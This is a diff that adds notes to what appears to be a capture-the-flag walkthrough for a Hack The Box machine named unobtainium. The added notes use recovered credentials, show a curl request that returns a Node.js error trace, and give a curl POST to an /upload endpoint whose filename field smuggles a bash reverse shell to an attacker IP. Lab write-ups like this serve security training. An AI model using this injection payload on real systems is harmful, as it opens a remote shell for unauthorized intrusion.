@@ -247,7 +247,40 @@
 
         data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}),
 
+// Now that we have credentials , we can try to connect with SSH to the machine , but it didnt worked
+
+-=-=-=-Burp_SUite=-=-=--
+
+    $ curl -X POST --data '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : ""}' -H "Content-Type: application/json" http://unobtainium.htb:31337/todo 
+------
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+    <meta charset="utf-8">
+    <title>Error</title>
+    </head>
+    <body>
+    <pre>Error: ENOENT: no such file or directory, open<br> 
+    &nbsp; &nbsp;at Object.openSync (fs.js:476:3)<br> 
+    &nbsp; &nbsp;at Object.readFileSync (fs.js:377:35)<br> 
+    &nbsp; &nbsp;at /usr/src/app/index.js:86:41<br> 
+    &nbsp; &nbsp;at Array.forEach (&lt;anonymous&gt;)<br> 
+    &nbsp; &nbsp;at /usr/src/app/index.js:84:36<br> 
+    &nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)<br> 
+    &nbsp; &nbsp;at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)<br> 
+    &nbsp; &nbsp;at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)<br> 
+    &nbsp; &nbsp;at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)<br> 
+    &nbsp; &nbsp;at /usr/src/app/node_modules/express/lib/router/index.js:281:22</pre>
+    </body>
+    </html>
+
 // 
+
+$curl -H "Content-Type: application/json" -X POST http://unobtainium.htb:31337/upload --data '{"auth": {"name": "felamos", "password": "Winter2021"},"filename":"$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/1444 0>&1')"}
+
+
+
 
 
     $ python3 dirsearch.py -u https://10.10.10.235:8443/ -t 100 -w /usr/share/dirb/wordlists/big.txt 
